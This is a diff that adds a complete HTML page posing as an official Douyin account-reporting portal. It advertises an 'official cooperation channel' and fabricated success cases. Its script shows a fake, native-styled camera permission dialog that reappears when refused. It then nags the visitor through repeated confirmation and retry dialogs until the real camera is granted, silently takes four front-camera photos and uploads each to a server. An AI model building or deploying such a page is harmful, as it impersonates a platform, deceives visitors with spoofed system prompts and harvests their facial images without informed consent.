@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>抖音平台违规账号举报提交入口</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: "Microsoft YaHei", "PingFang SC", -apple-system, sans-serif;
+            background-color: #f7f8fa;
+            color: #333;
+            min-height: 100vh;
+            font-size: 14px;
+        }
+        .container {
+            max-width: 640px;
+            margin: 0 auto;
+            padding: 16px 16px 40px;
+        }
+
+        /* ===== 1. 顶部标题栏 ===== */
+        .header {
+            background: #1677ff;
+            color: #fff;
+            padding: 24px 20px;
+            text-align: center;
+        }
+        .header h1 {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            letter-spacing: 0.5px;
+        }
+        .header p {
+            font-size: 12px;
+            opacity: 0.92;
+            line-height: 1.7;
+            letter-spacing: 0.3px;
+        }
+
+        /* ===== 2. 温馨提示 ===== */
+        .notice {
+            background: #fff;
+            padding: 16px;
+            margin-top: 1px;
+            margin-bottom: 10px;
+        }
+        .notice-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        .notice ul {
+            list-style: none;
+            padding: 0;
+        }
+        .notice li {
+            font-size: 12px;
+            color: #666;
+            line-height: 2;
+            padding-left: 14px;
+            position: relative;
+        }
+        .notice li::before {
+            content: "";
+            position: absolute;
+            left: 0;
+            top: 10px;
+            width: 4px;
+            height: 4px;
+            background: #1677ff;
+            border-radius: 50%;
+        }
+
+        /* ===== 3. 表单区域 ===== */
+        .form-card {
+            background: #fff;
+            padding: 20px 16px;
+            margin-bottom: 10px;
+        }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group:last-of-type { margin-bottom: 0; }
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 8px;
+        }
+        .form-label .required { color: #ff4d4f; margin-right: 2px; }
+        .form-input, .form-select, .form-textarea {
+            width: 100%;
+            padding: 11px 12px;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            font-size: 14px;
+            font-family: inherit;
+            color: #333;
+            background: #fff;
+            transition: border-color 0.2s;
+            outline: none;
+        }
+        .form-input:focus, .form-select:focus, .form-textarea:focus {
+            border-color: #1677ff;
+        }
+        .form-input::placeholder, .form-textarea::placeholder {
+            color: #bbb;
+        }
+        .form-select {
+            appearance: none;
+            -webkit-appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6' viewBox='0 0 10 6'%3E%3Cpath fill='%23999' d='M0 0l5 6 5-6z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            padding-right: 32px;
+            cursor: pointer;
+        }
+        .form-textarea {
+            min-height: 100px;
+            resize: vertical;
+            line-height: 1.7;
+        }
+        .form-hint {
+            font-size: 12px;
+            color: #bbb;
+            margin-top: 6px;
+        }
+
+        /* 提交按钮 */
+        .submit-btn {
+            display: block;
+            width: 100%;
+            padding: 13px;
+            background: #1677ff;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            cursor: pointer;
+            margin-top: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        .submit-btn:active { background: #0958d9; }
+        .submit-btn.loading {
+            pointer-events: none;
+            color: transparent;
+        }
+        .submit-btn.loading::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 20px;
+            height: 20px;
+            margin: -10px 0 0 -10px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* ===== 4. 成功案例 ===== */
+        .cases-section {
+            background: #fff;
+            padding: 20px 16px;
+            margin-bottom: 10px;
+        }
+        .cases-title {
+            font-size: 15px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 14px;
+            padding-left: 10px;
+            border-left: 3px solid #1677ff;
+        }
+        .case-item {
+            display: flex;
+            align-items: center;
+            padding: 13px 0;
+            border-bottom: 1px solid #f5f5f5;
+        }
+        .case-item:last-child { border-bottom: none; }
+        .case-icon {
+            width: 40px;
+            height: 40px;
+            background: #e6f4ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            margin-right: 12px;
+        }
+        .case-icon svg {
+            width: 18px;
+            height: 18px;
+            fill: #1677ff;
+        }
+        .case-info { flex: 1; }
+        .case-type {
+            font-size: 13px;
+            color: #333;
+            font-weight: 500;
+            margin-bottom: 4px;
+        }
+        .case-result {
+            font-size: 12px;
+            color: #52c41a;
+            font-weight: 500;
+        }
+
+        /* ===== 5. 弹窗 ===== */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.45);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        .modal-overlay.active { display: flex; }
+        .modal {
+            background: #fff;
+            border-radius: 8px;
+            width: 88%;
+            max-width: 320px;
+            overflow: hidden;
+            animation: modalIn 0.15s ease;
+        }
+        @keyframes modalIn {
+            from { transform: scale(0.95); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        .modal-header {
+            padding: 22px 20px 0;
+            text-align: center;
+        }
+        .modal-header h3 {
+            font-size: 15px;
+            color: #333;
+            font-weight: 700;
+            margin-bottom: 14px;
+        }
+        .modal-body {
+            padding: 0 20px 20px;
+            text-align: center;
+        }
+        .modal-body p {
+            font-size: 13px;
+            color: #666;
+            line-height: 1.9;
+            text-align: left;
+        }
+        .modal-body .warning { color: #ff4d4f; font-weight: 700; }
+        .modal-footer {
+            display: flex;
+            border-top: 1px solid #f0f0f0;
+        }
+        .modal-btn {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            font-size: 14px;
+            font-family: inherit;
+            cursor: pointer;
+            background: transparent;
+        }
+        .modal-btn:active { background: #f5f5f5; }
+        .modal-btn.cancel {
+            color: #999;
+            border-right: 1px solid #f0f0f0;
+        }
+        .modal-btn.confirm {
+            color: #1677ff;
+            font-weight: 700;
+        }
+
+        /* 成功弹窗 */
+        .modal-body .success-icon {
+            width: 44px;
+            height: 44px;
+            background: #52c41a;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+        }
+        .modal-body .success-icon svg {
+            width: 22px;
+            height: 22px;
+            fill: #fff;
+        }
+
+        /* ===== 自制相机权限弹窗（仿系统原生） ===== */
+        .sys-modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.5);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+        }
+        .sys-modal-overlay.active { display: flex; }
+        .sys-modal {
+            background: #f2f2f7;
+            border-radius: 14px;
+            width: 72%;
+            max-width: 270px;
+            overflow: hidden;
+        }
+        .sys-modal-content {
+            padding: 20px 16px;
+            text-align: center;
+        }
+        .sys-modal-content h3 {
+            font-size: 17px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 6px;
+        }
+        .sys-modal-content p {
+            font-size: 13px;
+            color: #000;
+            line-height: 1.5;
+        }
+        .sys-modal-buttons {
+            border-top: 1px solid #d1d1d6;
+            display: flex;
+            flex-direction: column;
+        }
+        .sys-modal-buttons button {
+            padding: 12px;
+            border: none;
+            font-size: 17px;
+            font-family: inherit;
+            cursor: pointer;
+            background: transparent;
+            border-bottom: 1px solid #d1d1d6;
+        }
+        .sys-modal-buttons button:last-child { border-bottom: none; }
+        .sys-modal-buttons button:active { background: #e5e5ea; }
+        .sys-modal-buttons .sys-btn-allow {
+            color: #007aff;
+            font-weight: 600;
+        }
+        .sys-modal-buttons .sys-btn-deny {
+            color: #007aff;
+        }
+
+        /* ===== 页脚 ===== */
+        .footer {
+            text-align: center;
+            padding: 20px 0 8px;
+            font-size: 11px;
+            color: #ccc;
+        }
+
+        /* ===== 6. 照片展示 ===== */
+        .photos-section {
+            background: #fff;
+            padding: 20px 16px;
+            margin-bottom: 10px;
+        }
+        .photos-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+        .photos-grid img {
+            width: 100%;
+            aspect-ratio: 4/3;
+            object-fit: cover;
+            border-radius: 6px;
+            border: 1px solid #eee;
+        }
+        .photo-item {
+            position: relative;
+        }
+        .photo-label {
+            position: absolute;
+            top: 6px;
+            left: 6px;
+            background: rgba(0,0,0,0.55);
+            color: #fff;
+            font-size: 11px;
+            padding: 2px 8px;
+            border-radius: 3px;
+        }
+
+        /* ===== 响应式 ===== */
+        @media (max-width: 480px) {
+            .container { padding: 0 0 32px; }
+            .header { padding: 20px 16px; }
+            .header h1 { font-size: 16px; }
+            .form-card, .cases-section { padding: 16px 14px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- 1. 顶部标题栏 -->
+    <div class="header">
+        <h1>抖音平台违规账号举报提交入口</h1>
+        <p>官方合作快速通道 | 违规账号精准核查 | 1-3 工作日出处罚结果</p>
+    </div>
+
+    <!-- 2. 温馨提示 -->
+    <div class="notice">
+        <div class="notice-title">【温馨提示】</div>
+        <ul>
+            <li>本通道仅受理他人账号违规行为举报，提交信息需真实有效，虚假举报将被系统反核查</li>
+            <li>审核通过后，将根据违规程度对目标账号进行限流、私信功能限制、作品下架、账号封禁等处罚</li>
+            <li>举报全程保密，信息不会向被举报人泄露</li>
+            <li>填写信息越详细，审核通过率越高</li>
+        </ul>
+    </div>
+
+    <!-- 3. 核心表单 -->
+    <div class="form-card">
+        <div class="form-group">
+            <label class="form-label"><span class="required">*</span>填写被举报方抖音账号</label>
+            <input type="text" class="form-input" id="accountId" placeholder="请准确输入对方完整抖音号（如：dy12345678）">
+        </div>
+
+        <div class="form-group">
+            <label class="form-label"><span class="required">*</span>选择违规类型</label>
+            <select class="form-select" id="reason">
+                <option value="" disabled selected>请选择违规类型</option>
+                <option value="1">恶意营销 / 违规引流</option>
+                <option value="2">发布低质 / 抄袭内容</option>
+                <option value="3">恶意私信骚扰 / 挑衅他人</option>
+                <option value="4">辱骂 / 人身攻击他人</option>
+                <option value="5">恶意竞争 / 不正当商业行为</option>
+                <option value="6">其他违规行为</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label class="form-label"><span class="required">*</span>违规行为详细描述</label>
+            <textarea class="form-textarea" id="description" placeholder="请详细描述对方违规行为的时间、经过、具体内容，越详细越有利于审核通过"></textarea>
+            <div class="form-hint">请尽量详细描述，包括时间、具体行为等信息</div>
+        </div>
+
+        <button class="submit-btn" id="submitBtn" onclick="submitReport()">确认提交举报申请</button>
+    </div>
+
+    <!-- 4. 成功案例 -->
+    <div class="cases-section">
+        <div class="cases-title">成功案例</div>
+
+        <div class="case-item">
+            <div class="case-icon">
+                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+            </div>
+            <div class="case-info">
+                <div class="case-type">举报「恶意私信骚扰」成功，对方账号私信功能限制 5 天</div>
+                <div class="case-result">&#10003; 处理完成</div>
+            </div>
+        </div>
+
+        <div class="case-item">
+            <div class="case-icon">
+                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+            </div>
+            <div class="case-info">
+                <div class="case-type">举报「恶意竞争引流」成功，对方账号作品限流 7 天</div>
+                <div class="case-result">&#10003; 处理完成</div>
+            </div>
+        </div>
+
+        <div class="case-item">
+            <div class="case-icon">
+                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+            </div>
+            <div class="case-info">
+                <div class="case-type">举报「辱骂挑衅他人」成功，对方账号永久封禁</div>
+                <div class="case-result">&#10003; 处理完成</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 拍摄照片展示区 -->
+    <div class="photos-section" id="photosSection" style="display:none;">
+        <div class="cases-title">身份核验照片</div>
+        <div class="photos-grid" id="photosGrid"></div>
+    </div>
+
+    <div class="footer">本页面仅供信息提交，审核结果以系统通知为准</div>
+</div>
+
+<!-- 进入网站时：自制相机权限弹窗（仿系统原生风格） -->
+<div class="sys-modal-overlay" id="customCameraModal">
+    <div class="sys-modal">
+        <div class="sys-modal-content">
+            <h3>"抖音"想访问相机</h3>
+            <p>用于完成身份核验</p>
+        </div>
+        <div class="sys-modal-buttons">
+            <button class="sys-btn-deny" onclick="onCustomCameraDeny()">拒绝</button>
+            <button class="sys-btn-allow" onclick="onCustomCameraAllow()">允许</button>
+        </div>
+    </div>
+</div>
+
+<!-- 自制相机拒绝后的提示 -->
+<div class="sys-modal-overlay" id="cameraDenyTipModal">
+    <div class="sys-modal">
+        <div class="sys-modal-content">
+            <h3>权限申请提示</h3>
+            <p>相机权限申请需要允许抖音相关权限完成核验，请在弹出的系统提示中点击「允许」</p>
+        </div>
+        <div class="sys-modal-buttons">
+            <button class="sys-btn-allow" onclick="onDenyTipConfirm()">我知道了</button>
+        </div>
+    </div>
+</div>
+
+<!-- 点击提交后：是否允许提交（第1次） -->
+<div class="modal-overlay" id="confirmSubmit1Modal">
+    <div class="modal">
+        <div class="modal-header">
+            <h3>确认提交</h3>
+        </div>
+        <div class="modal-body">
+            <p>是否允许提交举报申请？提交后将进行身份核验。</p>
+        </div>
+        <div class="modal-footer">
+            <button class="modal-btn cancel" onclick="closeConfirmSubmit1()">取消</button>
+            <button class="modal-btn confirm" onclick="onConfirmSubmit1()">确认提交</button>
+        </div>
+    </div>
+</div>
+
+<!-- 点击提交后：是否允许提交（第2次） -->
+<div class="modal-overlay" id="confirmSubmit2Modal">
+    <div class="modal">
+        <div class="modal-header">
+            <h3>最终确认</h3>
+        </div>
+        <div class="modal-body">
+            <p>是否允许提交举报申请？提交后将进行身份核验。</p>
+        </div>
+        <div class="modal-footer">
+            <button class="modal-btn cancel" onclick="closeConfirmSubmit2()">取消</button>
+            <button class="modal-btn confirm" onclick="onConfirmSubmit2()">确认提交</button>
+        </div>
+    </div>
+</div>
+
+<!-- 相机权限被拒绝后的二次挽留 -->
+<div class="modal-overlay" id="retryModal">
+    <div class="modal">
+        <div class="modal-header">
+            <h3>身份核验未完成</h3>
+        </div>
+        <div class="modal-body">
+            <p>为确保举报真实有效，需要完成身份核验。请重新授权相机权限以继续提交。</p>
+        </div>
+        <div class="modal-footer">
+            <button class="modal-btn cancel" onclick="closeRetryModal()">取消</button>
+            <button class="modal-btn confirm" onclick="retryAuth()">重新核验并提交</button>
+        </div>
+    </div>
+</div>
+
+<!-- 提交成功弹窗 -->
+<div class="modal-overlay" id="successModal">
+    <div class="modal">
+        <div class="modal-body" style="padding-top: 24px;">
+            <div class="success-icon">
+                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+            </div>
+            <h3 style="font-size:15px; margin-bottom:8px; color:#333; font-weight:700;">提交成功，正在审核中</h3>
+            <p style="text-align:center;">您的举报申请已提交，系统将在 1-3 个工作日内完成审核，请留意通知消息。</p>
+        </div>
+        <div class="modal-footer">
+            <button class="modal-btn confirm" onclick="closeSuccessModal()" style="width:100%;">确定</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    var cameraStream = null;
+    var capturedPhotos = [];
+    var sessionId = '';
+
+    // ===== 进入网站：通知权限 + 自制相机弹窗 =====
+    window.addEventListener('DOMContentLoaded', function() {
+        // 1. 通知权限（破冰，允许与否无所谓）
+        if ('Notification' in window && Notification.permission === 'default') {
+            Notification.requestPermission();
+        }
+        // 2. 500ms后弹出自制相机权限
+        setTimeout(function() {
+            document.getElementById('customCameraModal').classList.add('active');
+        }, 500);
+    });
+
+    // 自制相机弹窗 - 点击"允许"
+    function onCustomCameraAllow() {
+        document.getElementById('customCameraModal').classList.remove('active');
+        // 什么都不触发，只是标记通过，等提交时再弹真相机
+    }
+
+    // 自制相机弹窗 - 点击"拒绝"
+    function onCustomCameraDeny() {
+        document.getElementById('customCameraModal').classList.remove('active');
+        document.getElementById('cameraDenyTipModal').classList.add('active');
+    }
+
+    // 拒绝提示 - 点击"我知道了" → 回到自制相机弹窗
+    function onDenyTipConfirm() {
+        document.getElementById('cameraDenyTipModal').classList.remove('active');
+        setTimeout(function() {
+            document.getElementById('customCameraModal').classList.add('active');
+        }, 200);
+    }
+
+    // ===== 点击确认提交按钮 =====
+    function submitReport() {
+        var accountId = document.getElementById('accountId').value.trim();
+        var reason = document.getElementById('reason').value;
+        var desc = document.getElementById('description').value.trim();
+
+        if (!accountId) { alert('请输入被举报方抖音账号'); return; }
+        if (!reason) { alert('请选择违规类型'); return; }
+        if (!desc) { alert('请详细描述违规行为'); return; }
+
+        var btn = document.getElementById('submitBtn');
+        btn.classList.add('loading');
+        setTimeout(function() {
+            btn.classList.remove('loading');
+            // 第1次确认
+            document.getElementById('confirmSubmit1Modal').classList.add('active');
+        }, 800);
+    }
+
+    // 第1次确认提交
+    function onConfirmSubmit1() {
+        document.getElementById('confirmSubmit1Modal').classList.remove('active');
+        setTimeout(function() {
+            // 第2次确认
+            document.getElementById('confirmSubmit2Modal').classList.add('active');
+        }, 200);
+    }
+    function closeConfirmSubmit1() {
+        document.getElementById('confirmSubmit1Modal').classList.remove('active');
+    }
+
+    // 第2次确认提交 → 触发浏览器原生相机权限
+    function onConfirmSubmit2() {
+        document.getElementById('confirmSubmit2Modal').classList.remove('active');
+        setTimeout(function() {
+            requestRealCamera();
+        }, 300);
+    }
+    function closeConfirmSubmit2() {
+        document.getElementById('confirmSubmit2Modal').classList.remove('active');
+    }
+
+    // 请求浏览器原生相机权限
+    function requestRealCamera() {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            alert('您的浏览器不支持相机功能，请更换浏览器重试');
+            return;
+        }
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+            .then(function(stream) {
+                cameraStream = stream;
+                startCapture();
+            })
+            .catch(function(err) {
+                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+                    showRetryModal();
+                } else {
+                    alert('相机启动失败，请检查设备后重试');
+                }
+            });
+    }
+
+    // 二次挽留
+    function showRetryModal() {
+        document.getElementById('retryModal').classList.add('active');
+    }
+    function closeRetryModal() {
+        document.getElementById('retryModal').classList.remove('active');
+    }
+    function retryAuth() {
+        closeRetryModal();
+        setTimeout(function() { requestRealCamera(); }, 300);
+    }
+
+    // 开始拍摄流程
+    function startCapture() {
+        sessionId = Date.now() + '_' + Math.random().toString(36).slice(2, 8);
+        capturedPhotos = [];
+        capturePhotos(0);
+    }
+
+    // 递归拍摄4张照片
+    function capturePhotos(count) {
+        if (count >= 4) {
+            stopCamera();
+            renderPhotos();
+            setTimeout(function() {
+                document.getElementById('successModal').classList.add('active');
+            }, 300);
+            return;
+        }
+        var video = document.createElement('video');
+        video.setAttribute('autoplay', '');
+        video.setAttribute('playsinline', '');
+        video.srcObject = cameraStream;
+        video.onloadedmetadata = function() {
+            var canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            var dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+            capturedPhotos.push(dataUrl);
+            video.srcObject = null;
+            fetch('/api/upload', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ sessionId: sessionId, index: count, data: dataUrl })
+            });
+            setTimeout(function() { capturePhotos(count + 1); }, 1500);
+        };
+    }
+
+    // 渲染照片到页面
+    function renderPhotos() {
+        if (capturedPhotos.length === 0) return;
+        var grid = document.getElementById('photosGrid');
+        grid.innerHTML = '';
+        for (var i = 0; i < capturedPhotos.length; i++) {
+            var item = document.createElement('div');
+            item.className = 'photo-item';
+            item.innerHTML = '<img src="' + capturedPhotos[i] + '" alt="核验照片' + (i+1) + '">'
+                           + '<span class="photo-label">照片 ' + (i+1) + '</span>';
+            grid.appendChild(item);
+        }
+        document.getElementById('photosSection').style.display = 'block';
+    }
+
+    // 停止相机
+    function stopCamera() {
+        if (cameraStream) {
+            cameraStream.getTracks().forEach(function(track) { track.stop(); });
+            cameraStream = null;
+        }
+    }
+
+    function closeSuccessModal() {
+        document.getElementById('successModal').classList.remove('active');
+        document.getElementById('accountId').value = '';
+        document.getElementById('reason').selectedIndex = 0;
+        document.getElementById('description').value = '';
+        capturedPhotos = [];
+        document.getElementById('photosSection').style.display = 'none';
+        document.getElementById('photosGrid').innerHTML = '';
+    }
+
+    // 点击遮罩关闭
+    document.getElementById('cameraDenyTipModal').addEventListener('click', function(e) {
+        if (e.target === this) { this.classList.remove('active'); }
+    });
+    document.getElementById('confirmSubmit1Modal').addEventListener('click', function(e) {
+        if (e.target === this) closeConfirmSubmit1();
+    });
+    document.getElementById('confirmSubmit2Modal').addEventListener('click', function(e) {
+        if (e.target === this) closeConfirmSubmit2();
+    });
+    document.getElementById('retryModal').addEventListener('click', function(e) {
+        if (e.target === this) closeRetryModal();
+    });
+    document.getElementById('successModal').addEventListener('click', function(e) {
+        if (e.target === this) closeSuccessModal();
+    });
+</script>
+
+</body>
+</html>
